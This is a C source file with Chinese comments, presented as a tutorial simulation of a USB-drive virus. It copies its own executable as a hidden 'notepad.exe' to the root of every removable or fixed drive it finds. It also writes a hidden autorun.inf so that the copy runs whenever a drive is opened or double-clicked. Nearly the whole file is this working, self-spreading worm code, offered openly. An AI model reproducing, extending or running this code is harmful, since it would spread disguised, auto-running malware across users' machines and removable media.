#define _CRT_SECURE_NO_WARNINGS
#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
/*
	U盘病毒原理:
	U盘病毒主要依赖于AutoRun.inf文件.该文件的作用是在载入光盘(或者双击具有AutoRun.inf文件的驱动器盘符)时自动运行指定的某个文件.
*/
/*
	实现功能:模拟U盘病毒实现一个最简单的功能,在移动磁盘(DRIVE_REMOVEABLE类型的分区)或本地磁盘(DRIVER_FIXED类型的分区)上创建AutoRun.inf文件,
	还要将自身拷贝到盘符的根目录下
*/
/*
	1. 文件的打开和关闭
		打开文件:HANDLE WINAPI CreateFile(
			LPCTSTR lpFileName, //普通文件名或者设备文件名
			DWORD dwDesiredAccess, //访问模式（写/读）
			DWORD dwShareMode, //共享模式
			LPSECURITY_ATTRIBUTES lpSecurityAttributes, //指向安全属性的指针
			DWORD dwCreationDisposition, //如何创建
			DWORD dwFlagsAndAttributes, //文件属性
			HANDLE hTemplateFile //用于复制文件句柄
			);

		
	关闭:CloseHandle(Handle hObject)
		该函数可以用来关闭文件,事件,进程,线程等句柄
	2. 获取本地所有逻辑驱动器函数
		DWORD GetLogicalDriveStrings(DWORD length,LPTSTR lpBuffer);
		length:表示buffer的长度
		buffer:接收本地逻辑驱动器名的缓冲区
		返回值：
		函数的返回值指明了函数调用是否成功，如果成功则返回缓冲区中返回结果的总长度；如果返回值大于nBufferLength，说明给定的缓冲区大小不够，返回值是实际需要的大小；如果返回0，则说明函数运行出错。
		说明：
		函数调用成功后，将在缓冲区中依次填入本机所具有的驱动器根路径字符串，假如系统中有4个逻辑驱动器“C:\”、“D:\”、“E:\”，“F:\”。
	3. 获取驱动器类型函数:
		UINT GetDriveType(LPCTSTR lpRootPathName); 
		lpRootPathName:驱动器名,如"C:\"
	4. 复制文件函数
		BOOL CopyFile(LPCTSTR lpExistingFileName,LPCTSTR lpNewFileName,BOOL bFailIfExists );
		lpExistingFileName String，源文件名
		lpNewFileName String，目标文件名
		bFailIfExists Long，如果设为TRUE（非零），那么一旦目标文件已经存在，则函数调用会失败。否则目标文件被改写
*/
// 加\可以实现字符串换行书写,\r\n换行
char autoRun[] = "[AutoRun] \
\r\nopen = notepad.exe \
\r\nshell\\open = 打开(&O)\
\r\nshell\\open\\Command = notepad.exe\
\r\nshell\\explore = 资源管理器\
\r\nshell\\explore\\Command = notepad.exe\
\r\nshellexecute = notepad.exe\
\r\nshell\\Auto\\Command = notepad.exe\
";
void infect(char *pFile, UINT uDriverType) {
	char driverString[MAXBYTE] = { 0 };
	DWORD dwReturn = 0;
	DWORD number = 0;
	char root[4] = { 0 };
	UINT type = 0;
	char target[MAX_PATH] = { 0 };

	dwReturn = GetLogicalDriveStrings(MAXBYTE,driverString);
	printf("所有驱动器:%s\n", driverString);

	while (number < dwReturn)
	{
		strncpy(root, &driverString[number], 3);

		// 获取驱动器类型
		type = GetDriveType(root);

		if (type == uDriverType) {
			// 拷贝文件
			lstrcpy(target, root); //该函数复制字符串A到缓冲区B。
			lstrcat(target, "notepad.exe");
			// 将pFile拷贝到target,如果存在就覆盖
			CopyFile(pFile, target, FALSE);

			// 设置notepad.exe文件为隐藏属性
			SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);

			// 建立AutoRun.inf文件
			lstrcpy(target, root);
			lstrcat(target, "autorun.inf");
			HANDLE hFile = CreateFile(target, GENERIC_WRITE,0,NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);
			DWORD dwWritten = 0;
			WriteFile(hFile, autoRun, lstrlen(autoRun), &dwWritten, NULL);

			CloseHandle(hFile);
			// 设置AutoRun.inf文件为隐藏属性
			SetFileAttributes(target, FILE_ATTRIBUTE_HIDDEN);
		}
		number += 4;
	}
}
int main() {
	// 自身所在位置
	char szFileName[MAX_PATH] = { 0 };
	// 保存当前文件所在地盘符
	char szRoot[4] = { 0 };
	// 保存磁盘类型
	UINT uType = 0;

	// 获取当前所在完整路径及文件名
	GetModuleFileName(NULL, szFileName, MAX_PATH);
	printf("%s\n", szFileName);
	// 获取所在盘符
	strncpy(szRoot, szFileName, 3);
	uType = GetDriveType(szRoot);
	switch (uType) {
	case DRIVE_FIXED:
		// 如果是在硬盘上就检测一遍是否有移动磁盘
		infect(szFileName, DRIVE_REMOVABLE);
		break;
	case DRIVE_REMOVABLE:
		// 如果在移动磁盘上,则将自己复制到硬盘上
		infect(szFileName, DRIVE_FIXED);
		break;
	}

	system("pause");
	return 0;
}